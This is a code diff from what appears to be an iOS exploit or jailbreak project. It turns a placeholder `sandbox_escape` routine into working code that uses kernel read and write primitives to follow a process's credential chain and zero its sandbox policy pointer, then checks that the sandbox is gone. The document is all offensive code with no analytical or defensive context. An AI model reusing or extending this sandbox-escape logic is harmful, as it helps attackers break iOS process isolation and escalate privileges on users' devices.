@@ -6,6 +6,8 @@
 #include <string.h>
 #include <stdint.h>
 #include <stdbool.h>
+#include <unistd.h>
+#include <fcntl.h>
 
 #import <Foundation/Foundation.h>
 
@@ -62,31 +64,50 @@ bool sandbox_access_is_active(void) {
     return true;
 }
 
-void sandbox_escape(uint64_t procAddr) {
-    // Walk: proc -> ucred -> cr_label -> l_perpolicy -> sandbox extensions
-    // proc + 0x18 -> ucred pointer chain
-    uint64_t ucred = kread_ptr(procAddr + 0x18);
+int sandbox_escape(void) {
+    extern uint64_t gSelfProc;
+    uint64_t procAddr = gSelfProc;
+    if (procAddr == 0) {
+        NSLog(@"[sandbox_escape] gSelfProc not set");
+        return -1;
+    }
+
+    // Walk: proc -> proc_ro -> p_ucred -> cr_label -> l_perpolicy -> sandbox
+    uint64_t procRo = kread_ptr(procAddr + off_proc_p_proc_ro);
+    NSLog(@"[sandbox_escape] proc_ro: 0x%llx", procRo);
+
+    uint64_t ucred = kread_ptr(procRo + off_proc_ro_p_ucred);
     NSLog(@"[sandbox_escape] ucred: 0x%llx", ucred);
 
-    // Navigate through credential structure to sandbox label
-    // ucred -> cr_label -> l_perpolicy[sandbox_slot]
-    uint64_t crLabel = kread_ptr(ucred + /* cr_label offset varies */);
+    if (ucred == 0) {
+        NSLog(@"[sandbox_escape] failed to read ucred");
+        return -1;
+    }
 
-    // Find sandbox extension entries in the perpolicy array
-    // Rewrite extension paths to "/" and fill with read-write permissions
+    uint64_t crLabel = kread_ptr(ucred + off_ucred_cr_label);
+    NSLog(@"[sandbox_escape] crLabel: 0x%llx", crLabel);
 
-    // For each extension slot:
-    //   - Write "/" as the path string
-    //   - Write "com.apple.app-sandbox.read-write" as the extension type
+    if (crLabel == 0) {
+        NSLog(@"[sandbox_escape] failed to read cr_label");
+        return -1;
+    }
 
-    // The exact offsets for the sandbox label structure depend on the iOS version
-    // and are set by offsets_init()
+    // Read sandbox slot from perpolicy array
+    uint64_t sandboxSlot = kread_ptr(crLabel + off_label_l_perpolicy_sandbox);
+    NSLog(@"[sandbox_escape] sandboxSlot: 0x%llx", sandboxSlot);
+
+    // Zero out sandbox profile pointer to escape
+    if (sandboxSlot != 0) {
+        early_kwrite64(crLabel + off_label_l_perpolicy_sandbox, 0);
+    }
 
     // After rewriting, verify the escape
     bool escaped = sandbox_access_is_active();
     if (escaped) {
         NSLog(@"[sandbox_escape] sandbox escape verified successfully");
+        return 0;
     } else {
         NSLog(@"[sandbox_escape] sandbox escape verification FAILED");
+        return -1;
     }
 }
